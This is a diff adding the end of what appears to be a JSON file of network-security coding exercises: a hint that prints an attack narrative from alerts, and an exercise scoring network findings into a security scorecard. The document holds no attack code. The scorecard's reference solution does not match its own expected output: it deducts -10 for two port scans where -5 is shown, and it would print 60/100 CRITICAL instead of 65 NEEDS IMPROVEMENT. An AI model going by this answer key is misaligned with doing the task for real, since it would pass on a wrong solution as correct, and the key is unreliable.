+              "message": "def attack_narrative(alerts):\n    phases = {'port_scan':'Reconnaissance','vuln_scan':'Enumeration','brute_force':'Exploitation',\n              'ssh_login':'Access','data_exfil':'Exfiltration','lateral':'Lateral Movement'}\n    print('=== ATTACK NARRATIVE ===')\n    for phase, atype, desc in sorted(alerts):\n        pname = phases.get(atype, atype)\n        print(f'Phase {phase} [{pname}]: {atype}')\n        print(f'  {desc}')"
+            }
+          ]
+        },
+        {
+          "exercise_id": "ex_60",
+          "title": "Exercise 60: Network Security Scorecard",
+          "description": "Generate a security score based on all detected issues.",
+          "difficulty": "advanced",
+          "category": "Reporting & Real-World Scenarios",
+          "estimated_minutes": 8,
+          "ai_intro": "Let us work on network security scorecard! This is a advanced exercise in Reporting & Real-World Scenarios.",
+          "starter_code": "def security_score(findings):\n    # TODO: Calculate score from 0-100 based on findings\n    pass\n\nfindings = {\n    'port_scans': 2,\n    'syn_floods': 0,\n    'brute_force': 1,\n    'suspicious_dns': 5,\n    'cleartext_creds': 3,\n    'long_connections': 2,\n    'encrypted_traffic_pct': 85,\n}\nsecurity_score(findings)",
+          "expected_output": "=== NETWORK SECURITY SCORECARD ===\n  Port scans detected: 2 (-5)\n  Brute-force attempts: 1 (-5)\n  Suspicious DNS: 5 (-10)\n  Cleartext credentials: 3 (-15)\n  Long connections: 2 (-5)\n  HTTPS traffic: 85% (+5)\n  Score: 65/100 (NEEDS IMPROVEMENT)",
+          "hints": [
+            {
+              "message": "Start at 100, subtract points for each issue type. Add points for good practices."
+            },
+            {
+              "message": "Thresholds: >80=Good, 60-80=Needs Improvement, <60=Critical."
+            },
+            {
+              "message": "def security_score(findings):\n    score = 100\n    deductions = []\n    penalties = {'port_scans':(-5,'Port scans detected'),'syn_floods':(-20,'SYN floods'),\n        'brute_force':(-5,'Brute-force attempts'),'suspicious_dns':(-2,'Suspicious DNS'),\n        'cleartext_creds':(-5,'Cleartext credentials'),'long_connections':(-2.5,'Long connections')}\n    for k,(pen,desc) in penalties.items():\n        n = findings.get(k,0)\n        if n: d=int(pen*n); score+=d; deductions.append(f'{desc}: {n} ({d:+d})')\n    enc = findings.get('encrypted_traffic_pct',0)\n    if enc > 80: score+=5; deductions.append(f'HTTPS traffic: {enc}% (+5)')\n    score = max(0, min(100, score))\n    level = 'GOOD' if score>80 else 'NEEDS IMPROVEMENT' if score>60 else 'CRITICAL'\n    print('=== NETWORK SECURITY SCORECARD ===')\n    for d in deductions: print(f'  {d}')\n    print(f'  Score: {score}/100 ({level})')"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
